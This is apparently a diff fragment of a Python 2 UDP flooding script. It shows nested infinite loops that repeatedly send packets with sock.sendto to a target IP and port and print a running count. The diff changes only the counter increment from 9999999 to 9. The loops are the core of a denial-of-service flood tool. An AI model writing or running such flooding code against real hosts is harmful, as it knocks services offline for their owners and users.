@@ -38,13 +38,13 @@ sent = 0
 try:
    while True:
         sock.sendto(bytes, (ip,port))
-        sent = sent + 9999999
+        sent = sent + 9
         
         print "Sending %s packet to %s throught port:%s"%(sent,ip,port)
         
         while True:
              sock.sendto(bytes1, (ip,port))
-             sent = sent + 9999999
+             sent = sent + 9
              
              print "Sending %s packet to %s throught port:%s"%(sent,ip,port)
              
